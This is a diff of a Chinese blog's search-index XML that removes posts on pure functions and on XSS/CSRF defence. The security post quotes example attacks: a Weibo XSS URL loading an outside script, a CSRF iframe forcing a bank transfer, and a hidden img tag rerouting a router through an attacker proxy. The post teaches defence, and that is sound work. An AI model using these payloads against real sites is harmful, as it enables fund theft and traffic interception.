+<p><a href="https://juejin.im/entry/5b82b5e56fb9a01a02311b27" target="_blank" rel="noopener">Content Security Policy (CSP) 介绍</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>网络</category>
+      </categories>
+      <tags>
+        <tag>网络</tag>
+        <tag>安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【译文】React 的多态性</title>
     <url>/2018/11/20/translation-react-polymorphism/</url>
     <content><![CDATA[<blockquote>
@@ -1318,26 +1425,6 @@
       <tags>
         <tag>js</tag>
         <tag>浏览器</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>纯函数</title>
-    <url>/2018/11/20/pure-function/</url>
-    <content><![CDATA[<h2 id="纯函数"><a href="#纯函数" class="headerlink" title="纯函数"></a>纯函数</h2><blockquote>
-<p>参考<a href="https://mostly-adequate.gitbooks.io/mostly-adequate-guide/ch03.html" target="_blank" rel="noopener">JS函数式编程-Pure Happiness with Pure Functions</a></p>
-</blockquote>
-<p>这里不探讨一些概念，直接看纯函数的应用。以下是来自原书的例子。</p>
-<h3 id="小试身手"><a href="#小试身手" class="headerlink" title="小试身手"></a>小试身手</h3><h4 id="输入缓存"><a href="#输入缓存" class="headerlink" title="输入缓存"></a>输入缓存</h4><p>实现以下要求：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">squareNumber(<span class="number">4</span>);</span><br><span class="line"><span class="comment">//=&gt; 16</span></span><br><span class="line"></span><br><span class="line">squareNumber(<span class="number">4</span>); <span class="comment">// 从缓存中读取输入值为 4 的结果</span></span><br><span class="line"><span class="comment">//=&gt; 16</span></span><br><span class="line"></span><br><span class="line">squareNumber(<span class="number">5</span>);</span><br><span class="line"><span class="comment">//=&gt; 25</span></span><br><span class="line"></span><br><span class="line">squareNumber(<span class="number">5</span>); <span class="comment">// 从缓存中读取输入值为 5 的结果</span></span><br><span class="line"><span class="comment">//=&gt; 25</span></span><br></pre></td></tr></table></figure>
-<p>实现：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> memorize = <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> cache = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="function">(<span class="params">...args</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> argStr = <span class="built_in">JSON</span>.stringify(args);</span><br><span class="line">        cache[argStr] = cache[argStr] || fn(...args);</span><br><span class="line">        <span class="keyword">return</span> cache[argStr];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> squareNumber = memorize(<span class="function"><span class="params">x</span> =&gt;</span> x * x);</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>js 基础</category>
-      </categories>
-      <tags>
-        <tag>js</tag>
-        <tag>面试题</tag>
-        <tag>函数式编程</tag>
       </tags>
   </entry>
   <entry>
@@ -1473,93 +1560,6 @@
       </categories>
       <tags>
         <tag>网络</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xss 和 csrf 防范</title>
-    <url>/2020/07/12/xss-and-csrf/</url>
-    <content><![CDATA[<h3 id="XSS-and-CSRF"><a href="#XSS-and-CSRF" class="headerlink" title="XSS and CSRF"></a>XSS and CSRF</h3><p>来自维基百科：</p>
-<ul>
-<li><strong>CSS</strong> </li>
-</ul>
-<p>跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</p>
-<p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
-<ul>
-<li><strong>CSRF</strong></li>
-</ul>
-<p>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。[1] 跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p>
-<h4 id="XSS-攻击方法及防范"><a href="#XSS-攻击方法及防范" class="headerlink" title="XSS 攻击方法及防范"></a>XSS 攻击方法及防范</h4><p>XSS 大致可以分为两类：反射型 XSS 和储存型 XSS 。</p>
-<ul>
-<li>反射型 XSS</li>
-</ul>
-<p>被动的非持久性XSS。诱骗用户点击URL带攻击代码的链接，服务器解析后响应，在返回的响应内容中隐藏和嵌入攻击者的XSS代码，被浏览器执行，从而攻击用户。<br>URL可能被用户怀疑，但是可以通过短网址服务将之缩短，从而隐藏自己。</p>
-<ul>
-<li>储存型 XSS</li>
-</ul>
-<p>主动提交恶意数据到服务器，攻击者在数据中嵌入代码，这样当其他用户请求后，服务器从数据库中查询数据并发给用户，用户浏览此类页面时就可能受到攻击。典型的例子是留言板。</p>
-<p>还有 DOM-based XSS（基于 DOM 的 XSS），一般是攻击者通过代码注入（输入框，留言板）执行恶意代码，盗取 cookie ，获取敏感信息，进一步发起 CSRF 。</p>
-<p>防范：</p>
-<ul>
-<li>用户输入过滤。对用户提交的数据进行有效性验证，仅接受指定长度范围内并符合我们期望格式的的内容提交，阻止或者忽略除此外的其他任何数据</li>
-<li>用户输出转义，当需要将一个字符串输出到Web网页时，同时又不确定这个字符串中是否包括XSS特殊字符，为了确保输出内容的完整性和正确性，输出HTML属性时可以使用HTML转义编码（HTMLEncode）进行处理，输出到 <code>&lt;script&gt;</code> 中，可以进行JS编码。现在主流框架 Vue，React，或者衍生的 UI 框架，其实都有对输入输出做 XSS 防范。</li>
-<li>将重要的cookie标记为httponly，这样的话当浏览器向Web服务器发起请求的时就会带上cookie字段，但是在js脚本中却不能访问这个cookie，这样就避免了XSS攻击利用JavaScript的document.cookie获取cookie。【这种方法其实不是避免 XSS ，只是减小了可能的危害】</li>
-<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">CSP</a>指定页面有哪些资源允许有哪些来源，可以通过请求头的<code>Content-Security-Policy</code>头部，或html文档的meta标签实现。如下是掘金某篇博文的html文档header。<br><img src="./xss-and-csrf/xss1.png" alt=""></p>
-</li>
-<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/%E5%AD%90%E8%B5%84%E6%BA%90%E5%AE%8C%E6%95%B4%E6%80%A7" target="_blank" rel="noopener">SRI</a>在第三方 CDN 服务被入侵或回源被运营商劫持、文件内容被加入恶意代码时，网站如果启用了 SRI 策略，那么在支持 SRI 的浏览器下，被篡改的文件无法执行。</p>
-<ul>
-<li>对外链资源（这里是script，当然link标签也可以）使用特定算法A生成一个哈希值B，B经base64编码得到C.将<code>${A}-${C}</code><br>注入到script标签的<code>integrity</code>属性。例如：github的SRI策略<br><img src="./xss-and-csrf/SRI.png" alt=""><br>上图<code>sha512</code>是使用的哈希算法。 <code>-</code>后面的是编码后的哈希值。浏览器发现script标签有integrity属性，会用<code>sha512</code>计算这个script文件的哈希值，并base64编码后，和integrity的编码结果做比较。只有完全匹配才会通过校验并加载资源</li>
-<li>SRI是一种“宁为玉碎，不为瓦全”的态度了，但是如果重要脚本被劫持而无法执行，可能会使得整站功能不可用。可以使用fallback方法，改为加载本站资源</li>
-</ul>
-</li>
-</ul>
-<p><a href="https://coolshell.cn/articles/4914.html" target="_blank" rel="noopener">2011年新浪微博的 XSS 攻击</a>是储存型 XSS 。其利用了微博广场页面 <a href="http://weibo.com/pub/star" target="_blank" rel="noopener">http://weibo.com/pub/star</a> 的一个URL注入了js脚本，其通过 <a href="http://163.fm/PxZHoxn" target="_blank" rel="noopener">http://163.fm/PxZHoxn</a> 短链接服务，将链接指向：</p>
-<p><a href="http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update" target="_blank" rel="noopener">http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update</a></p>
-<p>注意，上面URL链接中的其实就是 <code>&lt;script src=//www.2kt.cn/images/t.js&gt;&lt;/script&gt;</code>。</p>
-<p>点击这个链接的用户会自动发一条类似“郭美美事件的一些未注意到的细节 <a href="https://t.cn/amsDE”" target="_blank" rel="noopener">https://t.cn/amsDE”</a> 的微博（博文中的链接是一个新的 evil url，一旦其他用户点击，就会把类似链接传递下去）。</p>
-<h4 id="CSRF-攻击方法和防范"><a href="#CSRF-攻击方法和防范" class="headerlink" title="CSRF 攻击方法和防范"></a>CSRF 攻击方法和防范</h4><p>以下内容译自 <a href="http://www.veracode.com/security/csrf" target="_blank" rel="noopener">CROSS-SITE REQUEST FORGERY GUIDE: LEARN ALL ABOUT CSRF ATTACKS AND CSRF PROTECTION</a></p>
-<p>CSRF：恶意网站向一个 Web app 发出请求，而用户已经在别的站点认证了这个 Web 程序。用这种方法，攻击者可以通过用户信任的浏览器，访问目标 web app 的功能。被攻击的目标包括 Web app，比如社交媒体，浏览器邮件客户端，网银和网络设备的 Web 界面。</p>
-<hr>
-<h5 id="CSRF-的关键概念"><a href="#CSRF-的关键概念" class="headerlink" title="CSRF 的关键概念"></a>CSRF 的关键概念</h5><ul>
-<li>恶意请求从用户访问的站点发送到攻击者觉得经过受害者认证的其他站点。</li>
-<li>通过目标站点身份验证的恶意请求，经受害者的浏览器被发送到目标站点。</li>
-<li>漏洞存在于受影响的 Web app 中，而不是受害者的浏览器或托管CSRF的站点。</li>
-</ul>
-<hr>
-<h5 id="执行一次-CSRF-攻击"><a href="#执行一次-CSRF-攻击" class="headerlink" title="执行一次 CSRF 攻击"></a>执行一次 CSRF 攻击</h5><p>CSRF 中，攻击者利用了目标 Web app 的身份认证机制。一次 CSRF 中，受害者必须通过目标站点的身份认证（登陆）。举个例子，网银 <code>examplebank.com</code> 有 CSRF 漏洞，如果我浏览这个站点上藏有 CSRF 隐患的页面，但是我没有登录，那么无事发生。假如我登录了，攻击中的请求将被执行，看起来就好像是我做的一样。（浏览器无法辨别用户是否主动请求）。</p>
-<p>接下来讲一下，上面的攻击的细节。首先假设我在 <code>examplebank.com</code> 登陆了我的帐号，所以我可以做一些网上银行操作，包括转账。</p>
-<p>现在我碰巧访问了 <code>somemalicioussite.com</code> ，这个站点攻击 <code>examplebank.com</code> 的用户，并且在本站设置了一个 CSRF 攻击，中招的用户会向帐号 123456789 转帐 $1,500.00 。在 <code>somemalicioussite.com</code> 的某个地方，攻击者加了这样一行代码：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"//www.veracode.com/%3Ca%20href%3D"</span>http:<span class="comment">//examplebank.com/app/transferFunds?amount=1500&amp;destinationAccount=123456789"&gt;http://examplebank.com/app/transferFunds?amount=1500&amp;destinationAccount=..." &gt;</span></span><br></pre></td></tr></table></figure>
-<p>通过加载这个 iframe ，我的浏览器会向 <code>examplebank.com</code> 发送一条转账请求，因为我已经在 <code>examplebank.com</code> 登陆了，所以请求将被执行，$1,500.00 转给了帐号 123456789 。</p>
-<hr>
-<h5 id="另一个-CSRF-例子"><a href="#另一个-CSRF-例子" class="headerlink" title="另一个 CSRF 例子"></a>另一个 CSRF 例子</h5><p>我买了一个新的家居无线路由器。同诸多 wifi 路由器，它通过一个 web 界面设置参数。我收到路由器的时候，它有一个内置 IP 地址 192.168.1.1 。我正不知如何设置路由器，刚好 <code>somemalicioussite.com</code> 上面有一个帖子有相关教程。攻击者在这个教程里面为我的路由器添加了一个代理，指向服务 123.45.67.89 ，以后通过路由器的流量都会经过这个代理，包括密码，sessionId。</p>
-<p>当我点击这个教程的时候，我忽略了一张加载失败的 1px 的小图：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=”http:<span class="comment">//192.168.1.1/admin/config/outsideInterface?nexthop=123.45.67.89” alt=”pwned” height=”1” width=”1”/&gt;</span></span><br></pre></td></tr></table></figure>
-<p>攻击者知道我正在读他们的教程，我会登陆路由器设置界面，所以他们把 CSRF 攻击藏在教程里面。有了上面的设置，我的路由会被添加一个代理服务器，所有经过路由器的流量也会经过这个代理服务器，攻击者就可以搞坏事了。</p>
-<hr>
-<h5 id="预防-CSRF"><a href="#预防-CSRF" class="headerlink" title="预防 CSRF"></a>预防 CSRF</h5><ul>
-<li>修改请求不要使用 GET ，暴露参数</li>
-<li>img/script 标签可以跨域，能带上cookie，并且还支持除GET之外的其它方式。所以这种方式也是能实现CSRF的</li>
-</ul>
-<p>方法一是每次请求都要在参数里面显示地带上token即登陆的票，虽然跨域请求能带上cookie，但是通过document.cookie仍然是获取不到其它源的cookie的，所以攻击者无法在代码里面拿到cookie里面的token，所以就没办法了。方法一的缺点是会暴露token，所以需要带token的最好不能是GET，因为GET会把参数拼在url里面，用户可能会无意把链接发给别人，但不知道这个链接带上了自己的登陆信息。</p>
-<p>方法二是每次转账请求前都先请求一个随机串，这个串只能用一次转账或者支付请求，用完就废弃，只有这个串对得上才能请求成功，攻击者是无法拿到这个串的，因为如果跨域请求带cookie，浏览器要求Access-Control-Allow-Origin不能为通配符，只能为指定的源。</p>
-<blockquote>
-<p>参考文章</p>
-</blockquote>
-<blockquote>
-<p><a href="https://www.imooc.com/article/13553" target="_blank" rel="noopener">对于跨站脚本攻击（XSS攻击）的理解和总结</a></p>
-<p><a href="https://www.zhihu.com/question/21289758" target="_blank" rel="noopener">存储型XSS与反射型XSS有什么区别？</a></p>
-<p><a href="https://coolshell.cn/articles/4914.html" target="_blank" rel="noopener">新浪微博的XSS攻击</a></p>
-<p><a href="http://www.veracode.com/security/csrf" target="_blank" rel="noopener">CROSS-SITE REQUEST FORGERY GUIDE: LEARN ALL ABOUT CSRF ATTACKS AND CSRF PROTECTION</a></p>
-<p><a href="https://fed.renren.com/2018/01/20/cross-origin/" target="_blank" rel="noopener">我知道的跨域与安全</a></p>
-<p><a href="https://juejin.im/entry/5b82b5e56fb9a01a02311b27" target="_blank" rel="noopener">Content Security Policy (CSP) 介绍</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>网络</category>
-      </categories>
-      <tags>
-        <tag>网络</tag>
-        <tag>安全</tag>
       </tags>
   </entry>
 </search>
